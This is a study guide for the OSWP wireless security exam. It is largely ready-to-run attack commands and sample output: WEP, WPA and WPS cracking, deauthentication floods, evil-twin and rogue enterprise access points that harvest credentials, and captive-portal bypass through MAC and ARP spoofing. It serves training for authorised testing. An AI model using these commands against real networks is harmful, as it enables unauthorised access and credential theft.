# OSWP Complete Gamebook - Offensive Security Wireless Professional
## The Ultimate Study Guide for Wireless Network Attacks

---

## Table of Contents

1. [Exam Overview and Common Mistakes](#exam-overview)
2. [Wi-Fi Encryption Fundamentals](#wifi-encryption)
3. [Linux Wireless Tools, Drivers, and Stacks](#linux-wireless)
4. [Wireshark Essentials for Wireless Analysis](#wireshark-essentials)
5. [Frames and Network Interaction](#frames-network)
6. [Aircrack-ng Essentials](#aircrack-essentials)
7. [Cracking Authentication Hashes](#cracking-hashes)
8. [Attacking WPS Networks](#wps-attacks)
9. [Rogue Access Points](#rogue-ap)
10. [Attacking Captive Portals](#captive-portals)
11. [Attacking WPA Enterprise](#wpa-enterprise)
12. [bettercap Essentials](#bettercap-essentials)
13. [Determining Chipsets and Drivers](#chipsets-drivers)
14. [Kismet Essentials](#kismet-essentials)
15. [Manual Network Connections](#manual-connections)
16. [Wireless Networks Fundamentals](#wireless-networks)
17. [Complete Command Reference](#command-reference)
18. [Exam Preparation Strategy](#exam-strategy)

---

## Exam Overview and Common Mistakes {#exam-overview}

### OSWP Exam Format
- **Duration**: 3 hours 45 minutes for exam + 24 hours for report submission
- **Scenarios**: 3 network scenarios (complete 2 out of 3, with 1 mandatory)
- **Objective**: Obtain wireless keys and access proof.txt from http://192.168.1.1/proof.txt
- **Format**: Practical hands-on exam with Kali Linux + report submission

### Critical Exam Requirements
- **Screenshots Required**: At least one screenshot of cracked wireless key AND one screenshot of proof.txt for each completed scenario
- **Report Format**: PDF format, archived in .7z file (max 200MB)
- **Filename Format**: OSWP-OS-XXXXX-Exam-Report.7z

### Common Mistakes Candidates Make

#### From Multiple Language Sources Analysis:

**Technical Mistakes:**
1. **Time Management Issues** - Not allocating sufficient time per scenario
2. **Tool Selection Errors** - Using automated tools (wifite, wifiphisher) which are PROHIBITED
3. **Insufficient Enumeration** - Not properly identifying network encryption details
4. **Poor Report Documentation** - Missing critical screenshots or inadequate step-by-step documentation
5. **Interface Configuration Errors** - Not properly setting monitor mode or wrong interface selection
6. **Wordlist Selection** - Using wrong wordlists or not using default Kali wordlists as specified

**Methodology Mistakes:**
1. **Skipping Reconnaissance Phase** - Not gathering complete target information
2. **Wrong Attack Vector Selection** - Choosing inefficient attack methods for scenario type
3. **Not Testing Connectivity** - Failing to verify connection after obtaining keys
4. **Inadequate Packet Capture** - Not capturing sufficient data for successful attacks

---

## Wi-Fi Encryption Fundamentals {#wifi-encryption}

### Encryption Types Overview

#### WEP (Wired Equivalent Privacy)
- **Key Lengths**: 64-bit (40-bit key + 24-bit IV) or 128-bit (104-bit key + 24-bit IV)
- **Vulnerabilities**: 
  - Weak IV implementation
  - Key scheduling algorithm flaws
  - Statistical attacks possible with sufficient IVs
- **Required IVs for Attack**: 
  - 64-bit: ~250,000 unique IVs minimum
  - 128-bit: ~1,500,000 unique IVs minimum

#### WPA/WPA2-PSK (Wi-Fi Protected Access)
- **WPA1**: TKIP encryption protocol
- **WPA2**: AES-CCMP encryption (stronger)
- **Requirements**: 4-way handshake capture for offline dictionary attacks
- **Key Derivation**: PBKDF2 with 4096 iterations (SSID as salt)

#### WPA3
- **SAE (Simultaneous Authentication of Equals)**
- **Forward Secrecy**: Session keys not compromised if PSK is compromised
- **Enhanced Protection**: Against offline dictionary attacks

#### WPA Enterprise (802.1X)
- **Authentication Server**: RADIUS server
- **EAP Methods**: PEAP, EAP-TLS, EAP-TTLS, etc.
- **Vulnerabilities**: Certificate validation bypasses, credential interception

---

## Linux Wireless Tools, Drivers, and Stacks {#linux-wireless}

### Wireless Stack Architecture
```
Application Layer (wpa_supplicant, hostapd)
    ↓
nl80211/cfg80211 (kernel interface)
    ↓
mac80211 (software MAC layer)
    ↓
Hardware Driver (device specific)
    ↓
Wireless Hardware
```

### Essential Interface Management

#### Monitor Mode Setup
```bash
# Kill conflicting processes
sudo airmon-ng check kill

# Start monitor mode
sudo airmon-ng start wlan0

# Verify monitor mode (interface becomes wlan0mon)
iwconfig
```

#### Manual Interface Configuration
```bash
# Bring interface down
sudo ip link set wlan0 down

# Set monitor mode manually
sudo iwconfig wlan0 mode monitor

# Bring interface up
sudo ip link set wlan0 up

# Set specific channel
sudo iwconfig wlan0 channel 6
```

#### Interface Information Gathering
```bash
# List wireless interfaces
iwconfig

# Show interface capabilities
iw list

# Show current interface info
iw dev wlan0 info

# Scan for networks
iw dev wlan0 scan
```

---

## Wireshark Essentials for Wireless Analysis {#wireshark-essentials}

### Wireless-Specific Filters

#### 802.11 Frame Analysis
```
# Management frames only
wlan.fc.type == 0

# Beacon frames
wlan.fc.type_subtype == 0x08

# Authentication frames
wlan.fc.type_subtype == 0x0b

# Association request/response
wlan.fc.type_subtype == 0x00 || wlan.fc.type_subtype == 0x01

# Deauthentication frames
wlan.fc.type_subtype == 0x0c

# Data frames
wlan.fc.type == 2

# Specific BSSID filtering
wlan.bssid == aa:bb:cc:dd:ee:ff

# EAPOL (WPA handshake) frames
eapol
```

#### WPA Handshake Analysis
```
# Four-way handshake messages
eapol.type == 3

# Message 1 of 4-way handshake
eapol.keydes.key_info == 0x008a

# Message 2 of 4-way handshake  
eapol.keydes.key_info == 0x010a

# Message 3 of 4-way handshake
eapol.keydes.key_info == 0x13ca

# Message 4 of 4-way handshake
eapol.keydes.key_info == 0x030a
```

### Decrypting Captured Traffic
```bash
# After cracking password, use airdecap-ng
airdecap-ng -e "SSID" -p "password" capture.cap

# Open decrypted traffic in Wireshark
wireshark capture-dec.cap
```

**Expected Output**: Wireshark will show decrypted HTTP, DNS, and other protocols instead of encrypted 802.11 data frames.

---

## Frames and Network Interaction {#frames-network}

### 802.11 Frame Structure

#### Frame Types
1. **Management Frames (Type 0)**
   - Beacon (Subtype 8): AP announcements
   - Authentication (Subtype 11): Authentication process
   - Association Request/Response (Subtype 0/1): Client connection
   - Deauthentication (Subtype 12): Forced disconnection

2. **Control Frames (Type 1)**
   - ACK (Subtype 13): Acknowledgment
   - RTS/CTS (Subtype 11/12): Request/Clear to Send

3. **Data Frames (Type 2)**
   - Data (Subtype 0): User data
   - QoS Data (Subtype 8): Quality of Service data

### Network Discovery Process
1. **Passive Scanning**: Listen for beacon frames
2. **Active Scanning**: Send probe requests
3. **Authentication**: Exchange authentication frames
4. **Association**: Establish connection with AP

---

## Aircrack-ng Essentials {#aircrack-essentials}

### Complete Aircrack-ng Suite Commands

#### Airodump-ng (Packet Capture)
```bash
# Basic network discovery
sudo airodump-ng wlan0mon

# Target specific network
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture wlan0mon

# Show WPS networks
sudo airodump-ng --wps wlan0mon

# Monitor specific bands
sudo airodump-ng --band abg wlan0mon

# Capture with manufacturer info
sudo airodump-ng --manufacturer wlan0mon
```

**Expected Output Format:**
```
BSSID              PWR  Beacons  #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
AA:BB:CC:DD:EE:FF  -45       52      0    0   6  54e  WPA2 CCMP   PSK  MyNetwork
```

#### Aireplay-ng (Packet Injection)

**Fake Authentication (WEP)**
```bash
# Send fake auth to WEP AP
sudo aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 -e "ESSID" wlan0mon
```

**ARP Replay Attack (WEP)**
```bash
# Replay ARP packets to generate IVs
sudo aireplay-ng --arpreplay -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon
```

**Deauthentication Attack**
```bash
# Deauth specific client
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CC:DD:EE:FF:00:11 wlan0mon

# Broadcast deauth (all clients)
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
```

#### Aircrack-ng (Key Cracking)

**WEP Cracking**
```bash
# PTW attack (default, requires ARP packets)
sudo aircrack-ng capture.cap

# Classic FMS/Korek attack
sudo aircrack-ng -K capture.cap

# Dictionary attack on WEP
sudo aircrack-ng -w wordlist.txt capture.cap
```

**WPA/WPA2 Cracking**
```bash
# Dictionary attack
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap

# Specific network selection
sudo aircrack-ng -w wordlist.txt -e "ESSID" capture.cap
```

**Expected Successful Output:**
```
KEY FOUND! [ password123 ]
Master Key     : CD D7 9A 5A CF B0 70 C7 E9 D1 02 3B...
Transient Key  : 33 55 0B FC 4F 24 84 F4 9A 38 B3 D0...
```

### Attack Methodologies

#### WEP Attack Process
1. **Capture IVs**: `airodump-ng -w wep_capture --bssid TARGET -c CHANNEL wlan0mon`
2. **Fake Authentication**: `aireplay-ng -1 0 -a TARGET -h YOUR_MAC wlan0mon`  
3. **Generate Traffic**: `aireplay-ng --arpreplay -b TARGET -h YOUR_MAC wlan0mon`
4. **Crack Key**: `aircrack-ng wep_capture.cap`

#### WPA/WPA2 Attack Process
1. **Capture Handshake**: `airodump-ng -w wpa_capture --bssid TARGET -c CHANNEL wlan0mon`
2. **Force Handshake**: `aireplay-ng -0 5 -a TARGET -c CLIENT wlan0mon`
3. **Verify Handshake**: Look for "WPA handshake" in airodump-ng output
4. **Crack Password**: `aircrack-ng -w wordlist.txt wpa_capture.cap`

---

## Cracking Authentication Hashes {#cracking-hashes}

### Hash Types and Tools

#### WPA/WPA2 PSK Hashes
```bash
# Using aircrack-ng
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap

# Convert to hashcat format
cap2hccapx capture.cap output.hccapx

# Using hashcat (mode 2500 for WPA/WPA2)
hashcat -m 2500 -a 0 capture.hccapx /usr/share/wordlists/rockyou.txt

# Using john the ripper
john --wordlist=/usr/share/wordlists/rockyou.txt --format=wpapsk hashes.txt
```

#### PMKID Hashes (WPA/WPA2 Clientless)
```bash
# Extract PMKID with hcxpcaptool
hcxpcaptool -z pmkid.txt capture.pcap

# Crack with hashcat (mode 16800)
hashcat -m 16800 -a 0 pmkid.txt /usr/share/wordlists/rockyou.txt
```

#### WPA Enterprise Hashes
```bash
# Extract challenge-response with asleap
asleap -C challenge -R response -W /usr/share/wordlists/rockyou.txt

# Using hashcat for MSCHAPv2
hashcat -m 5500 -a 0 hashfile.txt /usr/share/wordlists/rockyou.txt
```

### Performance Optimization
```bash
# Show hashcat benchmark
hashcat -b

# Use GPU acceleration
hashcat -m 2500 -d 1 -O capture.hccapx wordlist.txt

# Resume interrupted session
hashcat --restore
```

---

## Attacking WPS Networks {#wps-attacks}

### WPS Overview
- **PIN Method**: 8-digit PIN (but actually 7 digits + checksum)
- **Vulnerability**: PIN verified in two halves (4+3 digits)
- **Complexity Reduction**: ~11,000 attempts instead of 100,000,000

### WPS Enumeration
```bash
# Scan for WPS-enabled networks
sudo wash -i wlan0mon

# Show WPS information
sudo wash -i wlan0mon -s

# Filter by specific BSSID
sudo wash -i wlan0mon -b AA:BB:CC:DD:EE:FF
```

**Expected Output:**
```
BSSID                  Ch  dBm  WPS  Lck  Vendor    ESSID
AA:BB:CC:DD:EE:FF       6  -45  2.0  No   Linksys   MyNetwork
BB:CC:DD:EE:FF:00      11  -67  1.0  Yes  Netgear   GuestNet
```

### WPS PIN Attacks with Reaver
```bash
# Basic WPS PIN attack
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# Specify channel
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv

# Adjust timing (if getting rate limited)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -d 60 -x 3

# Ignore locks
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -L

# Resume previous session
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -s /etc/reaver/
```

**Expected Successful Output:**
```
[+] WPS PIN: '12345670'
[+] WPA PSK: 'password123'  
[+] AP SSID: 'MyNetwork'
```

### Pixie Dust Attack (CVE-2014-4910)
```bash
# Enable pixie dust mode
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -K 1

# Alternative with bully
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -d -v 3
```

### Post-WPS Attack Connection
```bash
# Create WPA supplicant config
wpa_passphrase "MyNetwork" "password123" > wps_network.conf

# Connect using discovered credentials
sudo wpa_supplicant -i wlan0 -c wps_network.conf -B
sudo dhclient wlan0
```

---

## Rogue Access Points {#rogue-ap}

### Rogue AP Attack Strategy
1. **Target Identification**: Find networks with connected clients
2. **Configuration Matching**: Match encryption and settings exactly
3. **Signal Strength**: Position for stronger signal than legitimate AP
4. **Credential Capture**: Collect authentication attempts

### Hostapd Configuration

#### Basic Rogue AP Setup
```bash
# Create hostapd configuration file
cat > rogue_ap.conf << EOF
interface=wlan0
driver=nl80211
ssid=TargetNetwork
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=FakePassword
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
EOF

# Start rogue AP
sudo hostapd rogue_ap.conf
```

#### Advanced Configuration for Target Matching
```bash
# Match target network exactly (from airodump-ng reconnaissance)
cat > target_clone.conf << EOF
interface=wlan0
driver=nl80211
ssid=RealNetworkName
hw_mode=g
channel=6
ieee80211n=1
wpa=3
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
rsn_pairwise=CCMP
wpa_passphrase=AnyPassword
EOF
```

### Hostapd-Mana (Advanced Rogue AP)
```bash
# Install hostapd-mana
sudo apt update
sudo apt install hostapd-mana

# Create mana configuration
cat > mana_ap.conf << EOF
interface=wlan0
ssid=TargetNetwork
channel=6
hw_mode=g
ieee80211n=1
wpa=3
wpa_key_mgmt=WPA-PSK
wpa_passphrase=ANYPASSWORD
wpa_pairwise=TKIP
rsn_pairwise=TKIP CCMP
mana_wpaout=/tmp/mana_handshakes.hccapx
EOF

# Launch mana AP
sudo hostapd-mana mana_ap.conf
```

### Deauthentication Attack Integration
```bash
# In second terminal, force clients to connect to rogue AP
sudo aireplay-ng -0 0 -a LEGITIMATE_AP_BSSID wlan1mon

# Monitor captured handshakes
tail -f /tmp/mana_handshakes.hccapx
```

**What to Look For**: Clients will attempt to connect to your rogue AP, providing 4-way handshake captures for offline cracking.

---

## Attacking Captive Portals {#captive-portals}

### Captive Portal Overview
- **Purpose**: Web-based authentication before network access
- **Common Locations**: Hotels, airports, coffee shops, corporate guest networks
- **Attack Vectors**: MAC spoofing, credential harvesting, session hijacking

### Bypass Techniques

#### Method 1: MAC Address Spoofing
```bash
# Discover authenticated clients
sudo airodump-ng wlan0mon

# Copy MAC of authenticated client
sudo macchanger -m AA:BB:CC:DD:EE:FF wlan0

# Connect to network
sudo wpa_supplicant -i wlan0 -c open_network.conf -B
sudo dhclient wlan0
```

#### Method 2: DNS Tunneling
```bash
# Using iodine for DNS tunneling
sudo iodined -f -c -P password 10.0.0.1 tunnel.domain.com

# Client connection
sudo iodine -f -P password tunnel.domain.com
```

#### Method 3: ARP Table Manipulation
```bash
# Discover gateway and authenticated hosts
nmap -sn 192.168.1.0/24

# ARP spoofing to hijack authenticated session
ettercap -T -M arp:remote /192.168.1.1// /192.168.1.50//
```

### Captive Portal Detection
```bash
# Check for captive portal redirect
curl -I http://httpbin.org/get

# Expected captive portal response
# HTTP/1.1 302 Found
# Location: https://captiveportal.example.com/login
```

### Credential Harvesting
```bash
# Set up fake captive portal (social engineering)
# Create convincing login page matching legitimate portal
# Use social engineering toolkit (SET)
sudo setoolkit
```

**Important**: Only use these techniques on networks you own or have explicit permission to test.

---

## Attacking WPA Enterprise {#wpa-enterprise}

### WPA Enterprise Overview
- **Authentication**: 802.1X with EAP methods
- **Common EAP Types**: PEAP-MSCHAPv2, EAP-TLS, EAP-TTLS
- **Attack Strategy**: Certificate spoofing and credential interception

### Reconnaissance Phase
```bash
# Identify enterprise networks
sudo airodump-ng --band abg wlan0mon | grep MGT

# Capture enterprise authentication
sudo airodump-ng --band abg -c 6 --bssid TARGET -w enterprise_capture wlan0mon
```

### Certificate Extraction and Analysis
```bash
# Extract certificate from capture
# Open capture in Wireshark and export certificate

# Analyze certificate details
openssl x509 -inform der -in certificate.der -text -noout
```

### Setting Up Rogue RADIUS Server

#### FreeRADIUS Configuration
```bash
# Install FreeRADIUS
sudo apt install freeradius

# Navigate to certificates directory
cd /etc/freeradius/3.0/certs

# Modify certificate information to match target
sudo nano ca.cnf
sudo nano server.cnf

# Generate new certificates
sudo make destroycerts
sudo make
```

#### Creating EAP User File
```bash
# Create mana.eap_user file
cat > /etc/hostapd-mana/mana.eap_user << EOF
*     PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2 "pass" [2]
EOF
```

### Rogue Enterprise AP Setup
```bash
# Create rogue enterprise configuration
cat > enterprise_rogue.conf << EOF
ssid=CorporateWiFi
interface=wlan0
driver=nl80211
channel=6
hw_mode=g

# Enterprise settings
ieee8021x=1
eap_server=1
eapol_key_index_workaround=0
eap_user_file=/etc/hostapd-mana/mana.eap_user

# Certificate paths
ca_cert=/etc/freeradius/3.0/certs/ca.pem
server_cert=/etc/freeradius/3.0/certs/server.pem
private_key=/etc/freeradius/3.0/certs/server.key
private_key_passwd=whatever
dh_file=/etc/freeradius/3.0/certs/dh

# WPA Enterprise
auth_algs=1
wpa=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP TKIP

# Mana settings
mana_wpe=1
mana_credout=/tmp/hostapd.credout
mana_eapsuccess=1
mana_eaptls=1
EOF

# Launch rogue enterprise AP
sudo hostapd-mana enterprise_rogue.conf
```

### Credential Harvesting and Cracking
```bash
# Monitor harvested credentials
tail -f /tmp/hostapd.credout

# Extract challenge/response for cracking
asleap -C challenge_hex -R response_hex -W /usr/share/wordlists/rockyou.txt

# Alternative with hashcat
echo "challenge:response" > mschap.hash
hashcat -m 5500 -a 0 mschap.hash /usr/share/wordlists/rockyou.txt
```

**Expected Output**: 
```
username:domain:challenge:response
john.doe:CORPORATE:1234567890abcdef:fedcba0987654321...
```

---

## bettercap Essentials {#bettercap-essentials}

### bettercap Overview
- **Purpose**: Network reconnaissance and attack framework  
- **Capabilities**: WiFi attacks, MITM, packet sniffing, deauth attacks
- **Advantages**: Modern interface, active development, comprehensive feature set

### Basic WiFi Operations

#### Starting bettercap
```bash
# Start bettercap with WiFi interface
sudo bettercap -iface wlan0mon

# Alternative: specify interface in session
sudo bettercap
> set wifi.interface wlan0mon
```

#### WiFi Reconnaissance
```bash
# Enable WiFi discovery
> wifi.recon on

# Show discovered networks
> wifi.show

# Filter and sort results
> set wifi.show.sort rssi desc
> set wifi.show.limit 10
> wifi.show

# Clear discovered networks
> wifi.clear
```

### Targeted Attacks

#### Deauthentication Attacks
```bash
# Deauth all clients from specific AP
> wifi.deauth AA:BB:CC:DD:EE:FF

# Deauth specific client
> set wifi.deauth.target AA:BB:CC:DD:EE:FF,CC:DD:EE:FF:00:11
> wifi.deauth AA:BB:CC:DD:EE:FF

# Continuous deauth
> set wifi.deauth.interval 5s
> wifi.deauth AA:BB:CC:DD:EE:FF
```

#### PMKID Attacks
```bash
# Enable PMKID association attacks
> set wifi.assoc.open false
> wifi.assoc AA:BB:CC:DD:EE:FF

# Attack all visible APs
> wifi.assoc all

# Monitor handshake capture
> set wifi.handshakes.file /tmp/bettercap-handshakes.pcap
```

### Rogue Access Point with bettercap
```bash
# Configure fake AP
> set wifi.ap.ssid FakeNetwork
> set wifi.ap.bssid aa:bb:cc:dd:ee:ff  
> set wifi.ap.channel 6
> set wifi.ap.encryption true

# Start fake AP (requires wifi.recon to be running)
> wifi.recon on
> wifi.ap on
```

### Advanced Features
```bash
# Channel hopping configuration
> set wifi.hop.period 250
> wifi.recon.channel 1,6,11

# Enable WPS information gathering
> wifi.show.wps all

# Probe specific networks
> wifi.probe aa:bb:cc:dd:ee:ff "TargetSSID"

# Monitor specific BSSID
> wifi.recon AA:BB:CC:DD:EE:FF
```

### Scripting with Caplets
```bash
# Create caplet file
cat > wifi_attack.cap << EOF
set wifi.interface wlan0mon
wifi.recon on
sleep 30
wifi.show
wifi.deauth all
EOF

# Run caplet
sudo bettercap -caplet wifi_attack.cap
```

**Expected Output Examples:**
```
WiFi > wifi.show
┃ RSSI ┃ BSSID             ┃ SSID      ┃ Encryption ┃ WPS ┃ CC ┃ Clients ┃
┃ -45  ┃ aa:bb:cc:dd:ee:ff ┃ MyNetwork ┃ WPA2 (PSK) ┃ ✓   ┃ US ┃ 3       ┃
```

---

## Determining Chipsets and Drivers {#chipsets-drivers}

### Hardware Identification Methods

#### USB Device Identification
```bash
# List all USB devices
lsusb

# Verbose USB device information
lsusb -v

# Check specific vendor/product ID
lsusb -d 148f:3070

# Monitor USB device connections
lsusb -t
```

**Example Output:**
```
Bus 001 Device 005: ID 148f:3070 Ralink Technology, Corp. RT2870/RT3070 Wireless Adapter
```

#### PCI Device Identification  
```bash
# List PCI devices
lspci

# Verbose PCI information
lspci -v

# Show network controllers only
lspci | grep Network

# Detailed info for specific device
lspci -vv -s 02:00.0
```

#### System Information Commands
```bash
# Check loaded kernel modules
lsmod | grep wifi
lsmod | grep 80211

# Hardware information
lshw -class network

# Device tree information  
dmesg | grep -i wifi
dmesg | grep -i wireless

# Network interface details
ethtool -i wlan0
```

### Driver Compatibility Checking

#### Monitor Mode Support
```bash
# Check interface capabilities
iw list | grep -A 10 "Supported interface modes"

# Look for 'monitor' in output
```

**Expected Output:**
```
Supported interface modes:
         * IBSS
         * managed  
         * AP
         * monitor
         * mesh point
```

#### Packet Injection Support
```bash
# Test packet injection capability
aireplay-ng --test wlan0mon

# Expected output should show injection working
```

### Common Chipset Information

#### Atheros Chipsets
```bash
# Driver: ath9k, ath5k
# Good compatibility with monitor mode and injection
# Common in: USB adapters, PCIe cards
```

#### Ralink/MediaTek Chipsets  
```bash
# Driver: rt2800usb, rt73usb, mt7601u
# Generally good compatibility
# Common in: USB dongles
```

#### Realtek Chipsets
```bash
# Driver: rtl8187, rtl8192cu, 8812au
# Variable compatibility (check specific model)
# May require custom drivers for newer models
```

#### Broadcom Chipsets
```bash
# Driver: brcmfmac, b43
# Limited monitor mode support
# Often require proprietary drivers
```

### Driver Installation and Configuration

#### Installing Missing Drivers
```bash
# Update system first
sudo apt update && sudo apt upgrade

# Install kernel headers
sudo apt install linux-headers-$(uname -r)

# Install build tools
sudo apt install build-essential dkms

# For USB devices, may need firmware
sudo apt install firmware-linux-nonfree
```

#### Compiling Custom Drivers
```bash
# Example for Alfa AWUS036ACS (rtl8812au)
git clone https://github.com/aircrack-ng/rtl8812au.git
cd rtl8812au
make
sudo make install
sudo modprobe 88XXau
```

### Troubleshooting Common Issues

#### Interface Not Detected
```bash
# Check if device is recognized
lsusb | grep -i wireless
dmesg | tail -20

# Try different USB port
# Check if driver is loaded
lsmod | grep [driver_name]
```

#### Monitor Mode Issues
```bash
# Kill interfering processes
sudo airmon-ng check kill

# Try manual monitor mode setup
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor  
sudo ip link set wlan0 up

# Check if monitor mode is active
iwconfig wlan0
```

---

## Kismet Essentials {#kismet-essentials}

### Kismet Overview
- **Purpose**: Wireless network detector, sniffer, and intrusion detection system
- **Capabilities**: Passive monitoring, device tracking, protocol analysis
- **Advantages**: Stealth operation, comprehensive logging, web interface

### Installation and Setup
```bash
# Install Kismet
sudo apt update
sudo apt install kismet

# Add user to kismet group (recommended)
sudo usermod -aG kismet $USER
```

### Basic Kismet Operations

#### Starting Kismet
```bash
# Start with default settings
sudo kismet

# Specify interface
sudo kismet -c wlan0mon

# Headless mode (no GUI)
sudo kismet -c wlan0mon --daemonize

# Custom config file
sudo kismet -c wlan0mon -f /path/to/config.conf
```

#### Web Interface Access
```bash
# Access web interface at:
# http://localhost:2501

# Set admin password on first run
# Navigate through web interface for network analysis
```

### Command Line Interface

#### Basic Commands
```bash
# Show data sources
sudo kismet --list-datasources

# Run without logging
sudo kismet -n

# Custom log directory
sudo kismet -c wlan0mon -t /custom/log/path

# Enable specific log types
sudo kismet -c wlan0mon -L kismet,pcap,gps
```

### Advanced Configuration

#### Multiple Interface Setup
```bash
# Monitor multiple interfaces
sudo kismet -c wlan0mon -c wlan1mon

# Different interface types
sudo kismet -c wifi:wlan0mon -c bluetooth:hci0
```

#### GPS Integration
```bash
# Start GPS daemon
sudo gpsd /dev/ttyUSB0

# Start Kismet with GPS
sudo kismet -c wlan0mon --gps
```

### Data Analysis and Logging

#### Log File Locations
```bash
# Default log directory
/var/log/kismet/

# Common log files:
# - Kismet-[timestamp].kismet (main log)
# - Kismet-[timestamp].pcap (packet capture)
# - Kismet-[timestamp].nettxt (network summary)
```

#### Analyzing Logs
```bash
# View captured packets in Wireshark
wireshark /var/log/kismet/*.pcap

# Parse kismet logs
kismet_log_to_xml --in /var/log/kismet/log.kismet --out networks.xml

# Export to different formats
kismet_log_devicetracker --in log.kismet --out devices.txt
```

### Network Detection Capabilities

#### Hidden SSID Detection
```bash
# Kismet automatically detects hidden SSIDs through:
# - Client probe requests
# - Association frames
# - Management frame analysis

# View in web interface or logs
grep "Hidden SSID" /var/log/kismet/*.nettxt
```

#### Device Tracking
```bash
# Track client devices and their behavior
# Web interface shows:
# - Device MAC addresses
# - Manufacturer information  
# - Connection patterns
# - Signal strength over time
```

### Integration with Other Tools

#### Exporting Data for aircrack-ng
```bash
# Use captured pcap files
aircrack-ng /var/log/kismet/*.pcap

# Convert kismet logs to airodump format
kismet_log_to_pcap --in log.kismet --out aircrack_ready.pcap
```

#### Wardriving Configuration
```bash
# Mobile setup with GPS
sudo kismet -c wlan0mon --gps -t /media/usb/wardriving_logs

# Optimized for mobile data collection
# Logs all networks encountered while moving
```

---

## Manual Network Connections {#manual-connections}

### Low-Level Connection Methods

#### Using iwconfig (Legacy)
```bash
# Scan for networks
sudo iwlist wlan0 scan

# Set interface mode
sudo iwconfig wlan0 mode managed

# Connect to open network
sudo iwconfig wlan0 essid "OpenNetwork"

# Set channel
sudo iwconfig wlan0 channel 6

# Set WEP key
sudo iwconfig wlan0 key 1234567890

# Get IP address
sudo dhclient wlan0
```

#### Using iw (Modern)
```bash
# Scan for networks
sudo iw dev wlan0 scan

# Connect to open network
sudo iw dev wlan0 connect "OpenNetwork"

# Set interface type
sudo iw dev wlan0 set type managed

# Disconnect
sudo iw dev wlan0 disconnect
```

### WPA/WPA2 Manual Connection

#### Creating wpa_supplicant Configuration
```bash
# Generate PSK for WPA network
wpa_passphrase "NetworkName" "password" > network.conf

# Example output:
network={
    ssid="NetworkName"
    #psk="password"
    psk=59e0d07fa4c7741797a4e394f38a5c321e3bed51d54ad5fcbd3f84bc7415d73d
}
```

#### Manual wpa_supplicant Connection
```bash
# Start wpa_supplicant
sudo wpa_supplicant -i wlan0 -c network.conf -B

# Get IP address
sudo dhclient wlan0 -v

# Check connection status
wpa_cli status
```

### Network Configuration Files

#### Open Network Configuration
```bash
cat > open_network.conf << EOF
network={
    ssid="OpenNetwork"
    key_mgmt=NONE
}
EOF
```

#### WPA Personal Configuration  
```bash
cat > wpa_network.conf << EOF
network={
    ssid="MyWPA2Network"
    psk="mypassword"
    key_mgmt=WPA-PSK
    proto=RSN
    pairwise=CCMP
    group=CCMP
}
EOF
```

#### WEP Configuration
```bash
cat > wep_network.conf << EOF  
network={
    ssid="WEPNetwork"
    key_mgmt=NONE
    wep_key0="1234567890"
    wep_tx_keyidx=0
}
EOF
```

#### WPA Enterprise Configuration
```bash
cat > enterprise.conf << EOF
network={
    ssid="CorporateWiFi"
    key_mgmt=WPA-EAP
    eap=PEAP
    identity="username"
    password="password"
    phase1="peaplabel=0"
    phase2="auth=MSCHAPV2"
}
EOF
```

### Interactive Connection with wpa_cli

#### Starting Interactive Session
```bash
# Start with control interface
sudo wpa_supplicant -i wlan0 -c /dev/null -B

# Start wpa_cli
sudo wpa_cli

# Interactive commands:
> scan
> scan_results  
> add_network
> set_network 0 ssid "NetworkName"
> set_network 0 psk "password"
> enable_network 0
> save_config
> quit
```

### Connection Verification

#### Checking Connection Status
```bash
# Check interface status
iwconfig wlan0

# Check IP configuration
ifconfig wlan0

# Test connectivity
ping -c 4 8.8.8.8

# Check routing table
route -n

# DNS resolution test
nslookup google.com
```

#### Troubleshooting Connection Issues
```bash
# Check wpa_supplicant logs
sudo journalctl -u wpa_supplicant

# Manual DHCP renewal
sudo dhclient -r wlan0
sudo dhclient wlan0

# Check wireless link quality
cat /proc/net/wireless

# Monitor connection in real-time
watch -n 1 iwconfig wlan0
```

---

## Wireless Networks Fundamentals {#wireless-networks}

### 802.11 Standards Overview

#### Frequency Bands and Standards
```
802.11   (1997):  2.4 GHz,    2 Mbps
802.11a  (1999):  5 GHz,     54 Mbps
802.11b  (1999):  2.4 GHz,   11 Mbps  
802.11g  (2003):  2.4 GHz,   54 Mbps
802.11n  (2009):  2.4/5 GHz, 600 Mbps
802.11ac (2013):  5 GHz,    6.93 Gbps
802.11ax (2019):  2.4/5 GHz, 9.6 Gbps
```

#### Channel Information
**2.4 GHz Channels (802.11b/g/n):**
- Channels 1-14 available (region dependent)
- 20 MHz channel width
- Non-overlapping channels: 1, 6, 11

**5 GHz Channels (802.11a/n/ac/ax):**
- More channels available
- Less interference
- 20/40/80/160 MHz channel widths

### Network Topologies

#### Infrastructure Mode (BSS - Basic Service Set)
- Clients connect through Access Point (AP)
- All communication goes through AP
- Most common deployment

#### Ad-Hoc Mode (IBSS - Independent BSS)  
- Peer-to-peer communication
- No central AP required
- Limited range and scalability

#### Extended Service Set (ESS)
- Multiple APs with same SSID
- Seamless roaming between APs
- Enterprise deployments

### Security Evolution

#### Open Networks
- No encryption
- Anyone can connect and intercept traffic
